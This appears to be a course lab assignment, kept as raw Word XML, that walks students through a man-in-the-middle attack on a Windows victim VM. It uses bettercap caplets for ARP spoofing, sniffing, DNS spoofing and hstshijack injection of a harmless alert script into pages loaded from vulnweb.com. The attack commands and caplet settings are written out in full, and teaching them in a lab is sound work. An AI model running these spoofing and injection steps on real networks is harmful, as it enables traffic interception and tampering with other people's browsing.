            <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
              <w:sz w:val="24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238663E4" w14:textId="77777777" w:rsidR="009A055F" w:rsidRDefault="00B14597" w:rsidP="00D12984">
      <w:r>
        <w:t>Logon to the Windows victim machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374B9F26" w14:textId="434AB173" w:rsidR="00B14597" w:rsidRDefault="000A6714" w:rsidP="00B14597">
      <w:r>
        <w:t xml:space="preserve">Run </w:t>
      </w:r>
      <w:r w:rsidRPr="00955A01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ipconfig</w:t>
      </w:r>
      <w:r w:rsidR="00955A01" w:rsidRPr="00955A01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> /all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF8EE92" w14:textId="77777777" w:rsidR="000A6714" w:rsidRPr="00D52BF8" w:rsidRDefault="000A6714" w:rsidP="000A6714">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D52BF8">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="1892303666"/>
        <w:placeholder>
          <w:docPart w:val="0E067DCF98194C3D8ED7D0F7F3A9EFD1"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="67E510A8" w14:textId="19BD9EF1" w:rsidR="000A6714" w:rsidRDefault="000A6714" w:rsidP="000A6714">
          <w:pPr>
            <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/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1A8752FA" w14:textId="35263E91" w:rsidR="00D12984" w:rsidRDefault="00D12984" w:rsidP="00D12984">
      <w:r w:rsidRPr="00D12984">
        <w:t xml:space="preserve">From the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Windows victim machine </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ping the Kali IP address to confirm network connectivity.</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-903829461"/>
        <w:placeholder>
          <w:docPart w:val="20F92C224FE94632BCBF2BF50AD00750"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="721DF984" w14:textId="77777777" w:rsidR="00D12984" w:rsidRDefault="00D12984" w:rsidP="00D12984">
          <w:pPr>
            <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/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253ECBE4" w14:textId="4C8F0D65" w:rsidR="00D314BB" w:rsidRPr="00F24480" w:rsidRDefault="00F24480" w:rsidP="00F24480">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc190963942"/>
      <w:r w:rsidRPr="00F24480">
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r w:rsidR="00D314BB" w:rsidRPr="00F24480">
        <w:t>Automate bettercap with a Caplet File</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="7520B9B3" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRPr="00214234" w:rsidRDefault="00D314BB" w:rsidP="00D314BB">
      <w:r>
        <w:t>We can automate the startup of bettercap with a caplet file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4330EF" w14:textId="0331F720" w:rsidR="00C71C0D" w:rsidRDefault="0066441F" w:rsidP="00D314BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0066441F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Kali Linux VM:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C71C0D">
        <w:t xml:space="preserve">Change to your bettercap folder: </w:t>
      </w:r>
      <w:r w:rsidR="00C71C0D" w:rsidRPr="00C71C0D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cd bettercap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060369C2" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRPr="00CA5879" w:rsidRDefault="00D314BB" w:rsidP="00D314BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA5879">
        <w:t>Type:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002676E4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>nano spoof.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFCDAD8" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRPr="00CA5879" w:rsidRDefault="00D314BB" w:rsidP="00D314BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Type in the following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14BB" w14:paraId="38C2D8DE" w14:textId="77777777" w:rsidTr="007A186C">
        <w:trPr>
          <w:cantSplit/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="3E64601E" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRDefault="00D314BB" w:rsidP="007A186C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>net.probe on</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BC83BF6" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRDefault="00D314BB" w:rsidP="007A186C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>set arp.spoof.fullduplex true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BB116C6" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRDefault="00D314BB" w:rsidP="007A186C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>set arp.spoof.targets 10.10.1.4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13C36B92" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRDefault="00D314BB" w:rsidP="007A186C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>arp.spoof on</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B027803" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRDefault="00D314BB" w:rsidP="007A186C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>net.sniff on</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="260684F5" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRDefault="00D314BB" w:rsidP="00D314BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA5879">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CTRL S</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to save.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63276958" w14:textId="77777777" w:rsidR="00D314BB" w:rsidRDefault="00D314BB" w:rsidP="00D314BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="49"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA5879">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>CTRL X</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to exit nano.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBE682B" w14:textId="05BB09CF" w:rsidR="00D314BB" w:rsidRDefault="00F24480" w:rsidP="00D314BB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc190963943"/>
      <w:r>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00D314BB">
        <w:t>. bettercap JavaScript Injection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="565117B9" w14:textId="0576BA43" w:rsidR="00C1510D" w:rsidRDefault="00A651B5" w:rsidP="00B650DD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Create a text file with nano. Make sure you are in your home directory</w:t>
      </w:r>
      <w:r w:rsidR="00637D4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51B5" w14:paraId="040758FC" w14:textId="77777777" w:rsidTr="00A651B5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="5C6AFEA6" w14:textId="5275FA0F" w:rsidR="00A651B5" w:rsidRDefault="00A651B5" w:rsidP="00A651B5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>cd ~</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="670348A9" w14:textId="7CFBA161" w:rsidR="00A651B5" w:rsidRDefault="00A651B5" w:rsidP="00A651B5">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00AF3950">
              <w:t>nano</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00646D13">
              <w:t>alert.js</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="087D1604" w14:textId="3B3E452E" w:rsidR="00612369" w:rsidRPr="00612369" w:rsidRDefault="00DB78EE" w:rsidP="00B650DD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We are creating a small Javascript file for our hacking attempt. </w:t>
      </w:r>
      <w:r w:rsidR="00612369" w:rsidRPr="00612369">
        <w:t>Add the following code</w:t>
      </w:r>
      <w:r w:rsidR="000B32D2">
        <w:t xml:space="preserve"> and save the file</w:t>
      </w:r>
      <w:r w:rsidR="00612369" w:rsidRPr="0061236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158B" w14:paraId="5CA12478" w14:textId="77777777" w:rsidTr="001E0417">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="23D5D034" w14:textId="7B0FEE1C" w:rsidR="00646D13" w:rsidRDefault="00646D13" w:rsidP="001E0417">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>alert(</w:t>
            </w:r>
            <w:r w:rsidRPr="00646D13">
              <w:t>'</w:t>
            </w:r>
            <w:r>
              <w:t>You have been hacked!</w:t>
            </w:r>
            <w:r w:rsidRPr="00646D13">
              <w:t>'</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F908A8C" w14:textId="63C61E2A" w:rsidR="00FA158B" w:rsidRDefault="003A173A" w:rsidP="00B650DD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Enter the following command to open the hstshijack.cap for editing.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6A81" w14:paraId="1F4B5F39" w14:textId="77777777" w:rsidTr="001E0417">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="3E460570" w14:textId="23B947F1" w:rsidR="00516A81" w:rsidRDefault="00976033" w:rsidP="001E0417">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo geany /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="38E34192" w14:textId="4A0CE3E9" w:rsidR="00A5227F" w:rsidRPr="007216F2" w:rsidRDefault="00BF73D5" w:rsidP="004D2BF9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Put </w:t>
      </w:r>
      <w:r w:rsidR="00FD4A3C">
        <w:t xml:space="preserve">the path to your </w:t>
      </w:r>
      <w:r w:rsidR="00FD4A3C" w:rsidRPr="004D2BF9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>alert.js</w:t>
      </w:r>
      <w:r w:rsidR="00FD4A3C">
        <w:t xml:space="preserve"> file at the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> end of the </w:t>
      </w:r>
      <w:r w:rsidRPr="004D2BF9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">set </w:t>
      </w:r>
      <w:r w:rsidR="00D83D34" w:rsidRPr="004D2BF9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidRPr="004D2BF9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>stshijack.payloads</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as shown</w:t>
      </w:r>
      <w:r w:rsidR="00FD4A3C">
        <w:t xml:space="preserve"> below</w:t>
      </w:r>
      <w:r w:rsidR="001F2E6B">
        <w:t>. The path will be longer than is shown.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56EC" w14:paraId="61CC3CC3" w14:textId="77777777" w:rsidTr="00CA56EC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="7536B04D" w14:textId="08C53E36" w:rsidR="00CD7F55" w:rsidRDefault="00CD7F55" w:rsidP="00CD7F55">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t># Add this to the end of the set hstshijack.payloads path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59F95664" w14:textId="790FFBAA" w:rsidR="00CA56EC" w:rsidRDefault="00725566" w:rsidP="00CD7F55">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00725566">
              <w:t>,</w:t>
            </w:r>
            <w:r w:rsidR="00CA56EC">
              <w:t>*</w:t>
            </w:r>
            <w:r w:rsidR="00792D78">
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidR="00CA56EC">
              <w:t>/home/user/alert.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E6074FD" w14:textId="77777777" w:rsidR="00CD7F55" w:rsidRDefault="00CD7F55" w:rsidP="00CD7F55">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="66CD5590" w14:textId="350AB46A" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="00CD7F55">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t># Comment the following lines out as shown</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CAD351B" w14:textId="77777777" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="007A669C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t># net.recon on</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BDB3D6D" w14:textId="77777777" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="007A669C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="14D058AA" w14:textId="77777777" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="007A669C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17E631F9" w14:textId="77777777" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="007A669C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>http.proxy on</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7517EA7B" w14:textId="77777777" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="007A669C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="318B6666" w14:textId="77777777" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="007A669C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t># set dns.spoof.domains  google.corn,*.google.corn,gstatic.corn,*.gstatic.corn</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BE41851" w14:textId="77777777" w:rsidR="007A669C" w:rsidRDefault="007A669C" w:rsidP="007A669C">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t># set dns.spoof.all      true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70B81A0C" w14:textId="18031706" w:rsidR="00CD7F55" w:rsidRDefault="007A669C" w:rsidP="00D26A70">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>dns.spoof on</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="50E0C0C2" w14:textId="1D728A69" w:rsidR="00295157" w:rsidRPr="00295157" w:rsidRDefault="00295157" w:rsidP="00295157">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E349C2F" wp14:editId="4ADDC568">
            <wp:extent cx="5943600" cy="698517"/>
            <wp:effectExtent l="38100" t="38100" r="95250" b="1016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17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699D4C" w14:textId="2115801E" w:rsidR="00B650DD" w:rsidRPr="003E64E1" w:rsidRDefault="00B650DD" w:rsidP="00B650DD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B650DD">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot</w:t>
      </w:r>
      <w:r w:rsidR="007E5AF6">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> of your caplet file</w:t>
      </w:r>
      <w:r w:rsidR="00870632">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> with the new entry</w:t>
      </w:r>
      <w:r w:rsidRPr="00B650DD">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-1865747886"/>
        <w:placeholder>
          <w:docPart w:val="13CA42F31A3E4BD58E9F5E1778FF758A"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="4F7B4DD3" w14:textId="38C43EA8" w:rsidR="00B650DD" w:rsidRDefault="00B650DD" w:rsidP="00B650DD">
          <w:pPr>
            <w:ind w:left="360"/>
          </w:pPr>
          <w:r w:rsidRPr="00B650DD">
            <w:rPr>
              <w:rStyle w:val="PlaceholderText"/>
              <w:color w:val="FF0000"/>
            </w:rPr>
            <w:t>Click or tap here to enter text.</w:t>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="25F22337" w14:textId="77777777" w:rsidR="00D51C7A" w:rsidRDefault="00D51C7A" w:rsidP="00D51C7A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Type the following command at the terminal start bettercap automatically.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1C7A" w14:paraId="3D6274EA" w14:textId="77777777" w:rsidTr="001E0417">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="553DC2AE" w14:textId="32E8E04C" w:rsidR="00D51C7A" w:rsidRPr="004D1B22" w:rsidRDefault="00D51C7A" w:rsidP="001E0417">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:bookmarkStart w:id="10" w:name="_Hlk84050432"/>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">sudo </w:t>
            </w:r>
            <w:r w:rsidR="000D4AE6">
              <w:t>./</w:t>
            </w:r>
            <w:r w:rsidRPr="004D1B22">
              <w:t xml:space="preserve">bettercap -iface eth0 </w:t>
            </w:r>
            <w:r>
              <w:t>-</w:t>
            </w:r>
            <w:r w:rsidRPr="004D1B22">
              <w:t>caplet spoof.cap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:bookmarkEnd w:id="10"/>
    <w:p w14:paraId="3B263F35" w14:textId="09DC5A07" w:rsidR="00D51C7A" w:rsidRPr="003D4B24" w:rsidRDefault="0013060B" w:rsidP="0013060B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Type at the prompt: </w:t>
      </w:r>
      <w:r w:rsidRPr="0013060B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>hstshijack/hstshijack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05215FB8" w14:textId="09F6F1DA" w:rsidR="003D4B24" w:rsidRPr="003D4B24" w:rsidRDefault="003D4B24" w:rsidP="0013060B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="003D4B24">
        <w:t>Press Enter</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to execute the attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C50B4A" w14:textId="1BB6CDA2" w:rsidR="001C0C5A" w:rsidRDefault="001E1B63" w:rsidP="003E64E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">On your victim VM: Open a web browser and go to </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:history="1">
        <w:r w:rsidR="00D26091" w:rsidRPr="00A25CC1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>www.vulnweb.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00D26091">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AA3CC3">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00AA3CC3">
        <w:t xml:space="preserve"> go to Acuform. </w:t>
      </w:r>
      <w:r w:rsidR="00D34093">
        <w:t xml:space="preserve">If that doesn’t work, try the others. </w:t>
      </w:r>
      <w:r w:rsidR="00AA3CC3">
        <w:t xml:space="preserve">You </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">should see </w:t>
      </w:r>
      <w:r w:rsidR="00D26091">
        <w:t xml:space="preserve">your </w:t>
      </w:r>
      <w:r w:rsidR="002D0A20">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="00D26091">
        <w:t xml:space="preserve"> alert</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E74B493" w14:textId="77777777" w:rsidR="003E64E1" w:rsidRPr="003E64E1" w:rsidRDefault="003E64E1" w:rsidP="003E64E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E64E1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="390549426"/>
        <w:placeholder>
          <w:docPart w:val="5504F915E218435EAF25D2A9D3249091"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="4909CECC" w14:textId="3E4048B0" w:rsidR="003E64E1" w:rsidRDefault="003E64E1" w:rsidP="003E64E1">
          <w:pPr>
            <w:ind w:left="360"/>
          </w:pPr>
          <w:r w:rsidRPr="003E64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053555D8" w14:textId="54C9D54A" w:rsidR="00845EB3" w:rsidRDefault="00845EB3" w:rsidP="00845EB3">
      <w:r>
        <w:t xml:space="preserve">You have successfully spoofed your victim </w:t>
      </w:r>
      <w:r w:rsidR="00D26091">
        <w:t xml:space="preserve">with your </w:t>
      </w:r>
      <w:r w:rsidR="00F17E2D">
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="00D26091">
        <w:t xml:space="preserve"> injection</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F42A634" w14:textId="6C67453C" w:rsidR="00CA7D5B" w:rsidRDefault="00CA7D5B" w:rsidP="00CA7D5B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Type </w:t>
      </w:r>
      <w:r w:rsidRPr="00B93099">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to stop bettercap.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F756262" w14:textId="53F5E968" w:rsidR="008913E0" w:rsidRDefault="008913E0" w:rsidP="008913E0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc190963944"/>
      <w:r>
        <w:t>Assignment Submission</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="1C081D04" w14:textId="760D7FCD" w:rsidR="008913E0" w:rsidRPr="008913E0" w:rsidRDefault="008913E0" w:rsidP="008913E0">
      <w:r>
        <w:t>Attach this completed document to the assignment in Blackboard.</w:t>
      </w:r>
    </w:p>
